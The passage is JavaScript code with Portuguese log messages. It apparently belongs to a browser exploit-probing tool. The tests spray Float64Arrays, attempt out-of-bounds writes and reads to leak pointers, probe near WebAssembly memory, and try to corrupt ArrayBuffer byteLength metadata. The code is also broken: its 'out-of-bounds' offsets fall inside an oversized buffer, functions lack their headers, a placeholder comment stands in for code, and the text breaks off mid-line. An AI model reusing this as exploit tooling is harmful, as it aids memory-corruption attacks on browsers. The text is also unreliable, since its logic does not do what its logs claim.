            const FNAME = 'testOOBReadInfoLeak'; log("--- Iniciando Teste 1: OOB Write/Read (Leak c/ Float64 Spray) ---", 'test', FNAME); const bufferSize = 64; const writeValue = 0xEE; const oobWriteOffset = bufferSize; const readRangeStart = -96; const readRangeEnd = bufferSize + 96; const allocationSize = bufferSize + 256; const baseOffsetInBuffer = 128; const sprayCount = 300; const floatArraySize = 8; const sprayedFloatArrays = []; const oobReadOffsets = []; for (let i = readRangeStart; i < readRangeEnd; i += 4) { oobReadOffsets.push(i); } let writeSuccess = false; let potentialLeakFoundCount = 0; leakedValueFromOOB = null; try { log(`Realizando spray de ${sprayCount} Float64Arrays (tamanho ${floatArraySize})...`, 'info', FNAME); for (let i = 0; i < sprayCount; i++) { try { const faBuffer = new ArrayBuffer(floatArraySize * 8); const fa = new Float64Array(faBuffer); fa[0] = i; for(let k = 1; k < floatArraySize; k++) { fa[k] = 0.5 + i; } sprayedFloatArrays.push(fa); } catch (e) { log(`Erro ao criar Float64Array ${i} no spray: ${e.message}`, 'warn', FNAME); break; } } log(`Spray concluído (${sprayedFloatArrays.length} arrays criados).`, 'info', FNAME); await PAUSE(SHORT_PAUSE); const buffer = new ArrayBuffer(allocationSize); const dataView = new DataView(buffer); for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xBB); } const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset; await PAUSE(); try { dataView.setUint8(writeTargetAddress, writeValue); log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) OK! Val=${toHex(writeValue, 8)}`, 'vuln', FNAME); log(`---> *** ALERTA: Primitivo Relevante (OOB Write Simples) ***`, 'escalation', FNAME); writeSuccess = true; } catch (e) { log(`Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) FALHOU/Bloqueada: ${e.message}`, 'good', FNAME); log(`--- Teste 1 Concluído (Escrita OOB Falhou) ---`, 'test', FNAME); return false; } await PAUSE(); log(`Tentando leitura OOB na faixa [${readRangeStart}, ${readRangeEnd})...`, 'info', FNAME); const tempReadView = new DataView(new ArrayBuffer(8)); for (const readOffset of oobReadOffsets) { const readTargetAddress = baseOffsetInBuffer + readOffset; const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`; if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) { try { const low = dataView.getUint32(readTargetAddress, true); const high = dataView.getUint32(readTargetAddress + 4, true); if (high === 0xBBBBBBBB && low === 0xBBBBBBBB) continue; tempReadView.setUint32(0, low, true); tempReadView.setUint32(4, high, true); const doubleVal = tempReadView.getFloat64(0, true); if (doubleVal >= 0 && doubleVal < sprayCount && Math.floor(doubleVal) === doubleVal) { log(` -> Spray Double? ${doubleVal.toFixed(1)} ${relOffsetStr}: H=${toHex(high)} L=${toHex(low)}`, 'leak', FNAME); potentialLeakFoundCount++; if (leakedValueFromOOB === null) { leakedValueFromOOB = { high, low, type: 'F64_SPRAY', offset: readOffset }; log(` -> VALOR SPRAY F64 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); } } else if (isPotentialPointer64(high, low)) { const vStr = `H=${toHex(high)} L=${toHex(low)}`; log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME); potentialLeakFoundCount++; if (leakedValueFromOOB === null) { leakedValueFromOOB = { high, low, type: 'U64', offset: readOffset }; log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}: H=${toHex(high)}, L=${toHex(low)}.`, 'vuln', FNAME); log(` ---> *** ALERTA: Primitivo Relevante (OOB Read Pointer Leak) ***`, 'escalation', FNAME); } } else if (low === floatArraySize * 8 && isPotentialPointer64(high, 0)) { log(` -> FloatArray Meta? (size=${low}) ${relOffsetStr}: H=${toHex(high)} L=${toHex(low)}`, 'leak', FNAME); potentialLeakFoundCount++; } } catch (e) {} } if (leakedValueFromOOB === null && readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) { try { const val32 = dataView.getUint32(readTargetAddress, true); if (val32 !== 0xBBBBBBBB) { if (isPotentialData32(val32)) { if (val32 >= 0x41414141 && val32 < (0x41414141 + sprayCount) || val32 === 0x42424242) { log(` -> Objeto Spray? U32 ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME); } else { log(` -> Leak U32? ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME); } potentialLeakFoundCount++; leakedValueFromOOB = { high: 0, low: val32, type: 'U32', offset: readOffset }; log(` -> VALOR U32 ARMAZENADO ${relOffsetStr}: ${toHex(val32)}.`, 'vuln', FNAME); log(` ---> *** ALERTA: Potencial Vazamento Info OOB Read U32 ***`, 'escalation', FNAME); } if (readOffset === oobWriteOffset && val32 === (writeValue | (0xBB << 8) | (0xBB << 16) | (0xBB << 24))) { log(` -> Leu valor OOB escrito (${toHex(val32)}) ${relOffsetStr}! Confirma R/W.`, 'vuln', FNAME); } } } catch (e) {} } if (readOffset % 32 === 0) await PAUSE(1); } } catch (e) { log(`Erro fatal no Teste 1: ${e.message}`, 'error', FNAME); console.error(e); } finally { sprayedFloatArrays.length = 0; const leakStatus = leakedValueFromOOB ? `1 valor ${leakedValueFromOOB.type} @${leakedValueFromOOB.offset} (H=${toHex(leakedValueFromOOB.high)}, L=${toHex(leakedValueFromOOB.low)})` : 'nenhum valor armazenado'; log(`--- Teste 1 Concluído (${potentialLeakFoundCount} leaks potenciais?, ${leakStatus}) ---`, 'test', FNAME); } return writeSuccess;

            const FNAME = 'testWasmMemoryLeak'; log("--- Iniciando Teste 2: OOB Read (Leak c/ Wasm Memory) ---", 'test', FNAME); if (typeof WebAssembly === 'undefined') { log("WebAssembly não suportado neste ambiente.", 'good', FNAME); log("--- Teste 2 Concluído (Wasm não suportado) ---", 'test', FNAME); return; } const bufferSize = 64; const readRangeStart = -96; const readRangeEnd = bufferSize + 96; const allocationSize = bufferSize + 256; const baseOffsetInBuffer = 128; let wasmMemory = null; let wasmInstance = null; let potentialLeakFoundCount = 0; let wasmLeakValue = null; try { log("Criando memória WebAssembly (1 página)...", 'info', FNAME); try { wasmMemory = new WebAssembly.Memory({ initial: 1 }); const wasmBytes = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x05, 0x03, 0x01, 0x00, 0x01, 0x07, 0x07, 0x01, 0x03, 0x6d, 0x65, 0x6d, 0x02, 0x00]); const wasmModule = await WebAssembly.compile(wasmBytes); wasmInstance = await WebAssembly.instantiate(wasmModule, { "": { mem: wasmMemory } }); log("Memória Wasm criada e instanciada.", 'good', FNAME); } catch (e) { log(`Erro ao criar/instanciar Wasm: ${e.message}`, 'error', FNAME); log("--- Teste 2 Concluído (Erro Wasm) ---", 'test', FNAME); return; } await PAUSE(SHORT_PAUSE); const buffer = new ArrayBuffer(allocationSize); const dataView = new DataView(buffer); for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xCC); } await PAUSE(); log(`Tentando leitura OOB na faixa [${readRangeStart}, ${readRangeEnd}) perto do buffer de controle...`, 'info', FNAME); const oobReadOffsets = []; for (let i = readRangeStart; i < readRangeEnd; i += 4) { oobReadOffsets.push(i); } for (const readOffset of oobReadOffsets) { const readTargetAddress = baseOffsetInBuffer + readOffset; const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`; if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) { try { const low = dataView.getUint32(readTargetAddress, true); const high = dataView.getUint32(readTargetAddress + 4, true); if (high === 0xCCCCCCCC && low === 0xCCCCCCCC) continue; if (isPotentialPointer64(high, low)) { const vStr = `H=${toHex(high)} L=${toHex(low)}`; log(` -> PTR? (Wasm context) U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME); potentialLeakFoundCount++; if (wasmLeakValue === null) { wasmLeakValue = { high, low, type: 'U64_WASM?', offset: readOffset }; log(` -> VALOR U64 (Wasm?) ARMAZENADO ${relOffsetStr}: H=${toHex(high)}, L=${toHex(low)}.`, 'vuln', FNAME); if (leakedValueFromOOB === null) leakedValueFromOOB = wasmLeakValue; } } else if (low === 65536 && high != 0xCCCCCCCC) { log(` -> Wasm Size? U64 ${relOffsetStr}: H=${toHex(high)} L=${toHex(low)}`, 'leak', FNAME); potentialLeakFoundCount++; } } catch (e) {} } if (wasmLeakValue === null && readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) { try { const val32 = dataView.getUint32(readTargetAddress, true); if (val32 !== 0xCCCCCCCC) { if (val32 === 65536) { log(` -> Wasm Size? U32 ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME); potentialLeakFoundCount++; } else if (isPotentialData32(val32)) { log(` -> Leak U32? (Wasm context) ${relOffsetStr}: ${toHex(val32)}`, 'leak', FNAME); potentialLeakFoundCount++; if (wasmLeakValue === null) { wasmLeakValue = { high: 0, low: val32, type: 'U32_WASM?', offset: readOffset }; log(` -> VALOR U32 (Wasm?) ARMAZENADO ${relOffsetStr}: ${toHex(val32)}.`, 'vuln', FNAME); if (leakedValueFromOOB === null) leakedValueFromOOB = wasmLeakValue; } } } } catch (e) {} } if (readOffset % 32 === 0) await PAUSE(1); } } catch (e) { log(`Erro fatal no Teste 2: ${e.message}`, 'error', FNAME); console.error(e); } finally { wasmMemory = null; wasmInstance = null; const leakStatus = wasmLeakValue ? `1 valor ${wasmLeakValue.type} @${wasmLeakValue.offset} (H=${toHex(wasmLeakValue.high)}, L=${toHex(wasmLeakValue.low)})` : 'nenhum valor armazenado'; log(`--- Teste 2 Concluído (${potentialLeakFoundCount} leaks potenciais?, ${leakStatus}) ---`, 'test', FNAME); }

        const testOOBWriteMetadata = async () => {
             // ... (código do teste 3 inalterado) ...
            const FNAME = 'testOOBWriteMetadata'; log("--- Iniciando Teste 3: OOB Write -> Metadata (ArrayBuffer.byteLength) ---",'test', FNAME); corruptedMetadataBuffer = null; const controlBufferSize=64; const targetBufferSize=64; const sprayCount=50; const targetValue=0x7FFFFFFE; const targetBuffers=[]; let controlBuffer=null; let dv=null; let writeSuccessCount = 0; let corruptionSuccess = false; const allocationSize = controlBufferSize + 256; const baseOffsetInBuffer = 128; let foundOffset=-1; let finalResultLog = `AVISO: Escrita OOB realizada (${writeSuccessCount}x), mas nenhuma corrupção de byteLength detectada.`; try{ controlBuffer=new ArrayBuffer(allocationSize); dv=new DataView(controlBuffer); for(let i=0; i<controlBuffer.byteLength; i++)dv.setUint8(i, 0xDD); }catch(e){ log(`Erro fatal alocar buffer ctrl: ${e.message}`, 'error', FNAME); return; } log(`Alocando ${sprayCount} buffers alvo de ${targetBufferSize} bytes...`, 'info', FNAME); for(let i=0; i<sprayCount; i++){ try{ targetBuffers.push(new ArrayBuffer(targetBufferSize)); }catch(e){}} await PAUSE(); const metadataOffsetsToTry=[-8, -4, 0, 4, 8, 12, 16, 20, 24, 28, 32]; for(const tryOffset of metadataOffsetsToTry){ const targetWriteAddr = baseOffsetInBuffer + controlBufferSize + tryOffset; const relOffsetStr = `ctrlEnd+${tryOffset} (addr ${targetWriteAddr})`; log(`Tentando offset OOB metadata: ${tryOffset}... Addr: ${targetWriteAddr}`, 'info', FNAME); let currentWriteOK=false; try{ if(targetWriteAddr >= 0 && targetWriteAddr + 4 <= controlBuffer.byteLength){ dv.setUint32(targetWriteAddr, targetValue, true); writeSuccessCount++; currentWriteOK=true; log(` -> Escrita OOB U32 em ${relOffsetStr} parece OK.`, 'info', FNAME); } else { log(` -> Offset OOB ${relOffsetStr} fora dos limites do buffer de controle.`, 'warn', FNAME); } }catch(e){ log(` -> Escrita OOB U32 falhou/bloqueada em ${relOffsetStr}: ${e.message}`, 'good', FNAME); } if(currentWriteOK){ log(` -> Verificando ${targetBuffers.length} buffers alvo..         };
